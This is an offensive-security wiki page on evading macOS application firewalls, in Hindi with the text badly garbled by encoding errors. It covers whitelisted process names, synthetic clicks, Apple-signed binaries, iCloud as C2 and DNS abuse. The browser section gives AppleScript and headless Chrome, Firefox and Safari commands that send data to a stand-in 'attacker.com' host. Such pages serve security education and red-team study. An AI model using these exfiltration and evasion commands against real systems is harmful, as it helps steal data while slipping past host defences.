# macOS рдлрд╝рд╛рдпрд░рд╡реЙрд▓ рдХреЛ рдЫрд▓рдХрд░рдирд╛

{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks рдкреНрд░рд╢рд┐рдХреНрд╖рдг AWS рд░реЗрдб рдЯреАрдо рд╡рд┐рд╢реЗрд╖рдЬреНрдЮ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks рдкреНрд░рд╢рд┐рдХреНрд╖рдг GCP рд░реЗрдб рдЯреАрдо рд╡рд┐рд╢реЗрд╖рдЬреНрдЮ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдБ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ!
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕**](https://github.com/carlospolop/hacktricks) рдФрд░ [**рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХреНрд▓рд╛рдЙрдб**](https://github.com/carlospolop/hacktricks-cloud) github рд░реЗрдкреЛ рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗред

</details>
{% endhint %}

## рдкрд╛рдП рдЧрдП рддрдХрдиреАрдХ

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рддрдХрдиреАрдХреЛрдВ рдХреЛ рдХреБрдЫ macOS рдлрд╝рд╛рдпрд░рд╡реЙрд▓ рдРрдкреНрд╕ рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рдкрд╛рдпрд╛ рдЧрдпрд╛ред

### рд╕рдлреЗрдж рд╕реВрдЪреА рдирд╛рдореЛрдВ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ

* рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдореИрд▓рд╡реЗрдпрд░ рдХреЛ **`launchd`** рдЬреИрд╕реЗ рдЬрд╛рдиреЗ-рдорд╛рдиреЗ macOS рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЗ рдирд╛рдореЛрдВ рд╕реЗ рдмреБрд▓рд╛рдирд╛

### рд╕рд┐рдВрдереЗрдЯрд┐рдХ рдХреНрд▓рд┐рдХ

* рдЕрдЧрд░ рдлрд╝рд╛рдпрд░рд╡реЙрд▓ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реЗ рдЕрдиреБрдорддрд┐ рдХреЗ рд▓рд┐рдП рдкреВрдЫрддрд╛ рд╣реИ рддреЛ рдореИрд▓рд╡реЗрдпрд░ рдХреЛ **рдЕрдиреБрдорддрд┐ рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП

### **рдПрдкреНрдкрд▓ рджреНрд╡рд╛рд░рд╛ рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рдмрд╛рдЗрдирд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ**

* рдЬреИрд╕реЗ **`curl`**, рд▓реЗрдХрд┐рди рдЕрдиреНрдп рднреА рдЬреИрд╕реЗ **`whois`**

### рдЬрд╛рдиреЗ-рдорд╛рдиреЗ рдПрдкреНрдкрд▓ рдбреЛрдореЗрди

рдлрд╝рд╛рдпрд░рд╡реЙрд▓ рдХреЛ рдЬрд╛рдиреЗ-рдорд╛рдиреЗ рдПрдкреНрдкрд▓ рдбреЛрдореЗрдиреНрд╕ рдЬреИрд╕реЗ **`apple.com`** рдпрд╛ **`icloud.com`** рдХрдиреЗрдХреНрд╢рди рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛ рд╕рдХрддреА рд╣реИред рдФрд░ iCloud рдХреЛ C2 рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

### рд╕рд╛рдорд╛рдиреНрдп рдЫрд▓рдХрд░рдирд╛

рдлрд╝рд╛рдпрд░рд╡реЙрд▓ рдХреЛ рдЫрд▓рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреБрдЫ рд╡рд┐рдЪрд╛рд░

### рдЕрдиреБрдорддрд┐ рдкреНрд░рд╛рдкреНрдд рдЯреНрд░реИрдлрд╝рд┐рдХ рдХреА рдЬрд╛рдБрдЪ

рдЕрдиреБрдорддрд┐ рдкреНрд░рд╛рдкреНрдд рдЯреНрд░реИрдлрд╝рд┐рдХ рдХреЛ рдЬрд╛рдирдирд╛ рдЖрдкрдХреЛ рдкреЛрдЯреЗрдВрд╢рд┐рдпрд▓реА рд╕рдлреЗрдж рд╕реВрдЪреА рдбреЛрдореЗрди рдпрд╛ рдЬрд┐рди рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреНрд╕ рдХреЛ рдЙрди рдбреЛрдореЗрдиреЛрдВ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ, рдЙрдиреНрд╣реЗрдВ рдкрд╣рдЪрд╛рдирдиреЗ рдореЗрдВ рдорджрдж рдХрд░реЗрдЧрд╛ред
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### DNS рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ

DNS рдирд┐рд░реНрдзрд╛рд░рдг **`mdnsreponder`** рд╕рд╛рдЗрди рдХреА рдЧрдИ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрд┐рд╕реЗ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ DNS рд╕рд░реНрд╡рд░ рд╕реЗ рд╕рдВрдкрд░реНрдХ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреА рдЬрд╛рдПрдЧреАред

<figure><img src="../../.gitbook/assets/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдРрдкреНрд╕ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ

* **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
* рдЧреВрдЧрд▓ рдХреНрд░реЛрдо

{% code overflow="wrap" %}
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
{% endcode %}

* рдлрд╝рд╛рдпрд░рдлрд╝реЙрдХреНрд╕
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
* рд╕рдлрд╛рд░реА
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдЗрдВрдЬреЗрдХреНрд╢рди рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ

рдпрджрд┐ рдЖрдк **рдХреЛрдб рдХреЛ рдХрд┐рд╕реА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдЗрдВрдЬреЗрдХреНрдЯ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдХрд┐рд╕реА рд╕рд░реНрд╡рд░ рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ рддреЛ рдЖрдк рдлрд╝рд╛рдпрд░рд╡реЙрд▓ рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдЫрд▓ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="macos-proces-abuse/" %}
[macos-proces-abuse](macos-proces-abuse/)
{% endcontent-ref %}

## рд╕рдВрджрд░реНрдн

* [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)

{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдкреНрд░реИрдХреНрдЯрд┐рд╕ рдХрд░реЗрдВ:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдкреНрд░реИрдХреНрдЯрд┐рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдБ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ!
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдФрд░ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдХреЛ** **рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github рд░реЗрдкреЛ рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗред

</details>
{% endhint %}
